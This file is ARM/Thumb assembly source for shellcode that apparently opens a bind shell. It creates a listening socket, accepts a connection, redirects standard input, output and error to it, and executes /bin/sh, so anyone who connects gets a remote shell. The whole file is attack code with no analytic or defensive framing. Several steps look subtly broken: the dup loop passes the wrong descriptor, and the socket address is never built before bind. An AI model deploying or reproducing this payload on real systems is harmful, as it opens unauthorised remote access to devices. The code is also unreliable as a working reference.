/**

*/

    .global _start
    .text

_start:
    // load sockaddr_in and /bin/sh
    bic    r4, ~0xd2040002
    // switch to thumb mode
	  .code 32
    add    r3, pc, #1
    bx     r3	
  
    .code 16
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    eor    r2, r2, r2   // r2 = IPPROTO_IP
    mov    r1, #1       // r1 = SOCK_STREAM
    mov    r0, #2       // r0 = AF_INET
    lsl    r7, r1, #8   // multiply by 256
    add    r7, #25      // r7 = 256+25 = 281 = socket
    svc    1
    
    mov    r6, r0       // r6 = s
    
    // bind(s, &sa, sizeof(sa));  
    mov    r2, #16      // r2 = sizeof(sa)
    mov    r1, sp       // r1 = &sa     
    add    r7, #1       // r7 = 281+1 = 282 = bind
    svc    1
  
    // listen(s, 0);
    eor    r1, r1, r1   // r1 = 0    
    mov    r0, r6
    add    r7, #2       // r7 = 282+2 = 284 = listen 
    svc    1    
    
    // r = accept(s, 0, 0);
    eor    r2, r2, r2   // r2 = 0
    eor    r1, r1, r1   // r1 = 0
    mov    r0, r6       // r0 = s
    add    r7, #1       // r7 = 284+1 = 285 = accept    
    svc    1    
    
    mov    r7, r0       // r7 = r
    
    // dup(r, FILENO_STDIN);
    // dup(r, FILENO_STDOUT);
    // dup(r, FILENO_STDERR);
    mov    r1, #2       // for 3 descriptors
dup_loop:
    mov    r7, #63      // r7 = dup 
    mov    r0, r7       // r0 = r
    svc    1
    sub    r1, #1       // 
    bpl    dup_loop

    // execve("/bin/sh", {"/bin/sh", NULL}, NULL);
    add    r0, pc, #20   // r0 = "/bin/sh" 
    eor    r2, r2, r2    // r2 = NULL
    eor    r1, r1, r1    // r1 = NULL
    // push {r0, r2}      // "/bin/sh", NULL
    // mov  r1, sp        // r1 = {"/bin/sh", NULL}
    mov    r7, #11       // r7 = execve
    svc    1
    nop
    nop  
.ascii "/bin/sh"





